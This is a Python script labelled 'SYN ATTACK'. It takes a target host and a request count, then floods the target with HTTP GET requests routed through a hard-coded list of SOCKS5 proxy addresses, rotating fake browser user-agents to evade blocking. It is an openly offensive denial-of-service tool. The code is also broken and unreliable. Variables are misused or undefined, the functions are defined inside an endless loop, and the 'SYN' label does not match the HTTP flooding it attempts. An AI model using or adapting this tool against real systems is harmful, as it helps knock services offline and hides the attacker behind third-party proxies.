import asyncio
import aiohttp
import requests
import threading
import random
import aiohttp_socks as socks

print("")
print("SYN ATTACK")
print("")
host = input("Host : ")
user_agent = [
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4",
  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MSBrowserIE; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910V 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H143 Safari/600.1.4",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
]

socks5 = [
  'socks5://104.17.162.164:80',
  'socks5://172.67.158.52:80',
  'socks5://198.44.206.1:1337',
  'socks5://185.47.48.109:1025',
  'socks5://103.121.23.205:8080',
  'socks5://45.8.104.193:80',
  'socks5://141.193.213.4:80',
  'socks5://3.8.209.153:3128',
  'socks5://23.227.39.58:80',
  'socks5://98.170.57.249:4145',
  'socks5://156.239.53.235:3128',
  'socks5://151.236.14.178:5678',
  'socks5://142.132.186.193:3128',
  'socks5://203.30.188.58:80',
  'socks5://143.47.185.211:80',
  'socks5://104.25.158.118:80',
  'socks5://104.18.125.215:80',
  'socks5://159.69.214.139:3128',
  'socks5://185.162.230.173:80',
  'socks5://172.64.175.2:80',
  'socks5://193.233.210.49:8085',
]

data = {'key': 'Value'}

while True: 
  async def send_atack(user_agent, send_atack):
    socks = random.choice(socks5)
    socks.set_default_proxy(socks.SOCKS5, socks_proxy.split(':')[1].replace('//',''), int(socks_proxy.split(':')[2]))
    connector = aiohttp.ProxyConnector.from_url(socks)
    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        for user_agents in user_agent:
          headers = {"User-Agent": random.choice(user_agent)}
          async with session.get(host, headers=headers) as response:
            if response.status == 200:
              print(f"[+] Packet Done")
            else:
              print(f"[-] Target Seized ")

  async def main():
    num_attack = int(input("Num Packet : "))

    thread = []
    for attack in range(num_attack):
      tasks = asyncio.ensure_future(send_atack(user_agent, send_atack))
      thread.append(tasks)

    await asyncio.gather(*thread)

  if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())

  print("[+] KILLED")
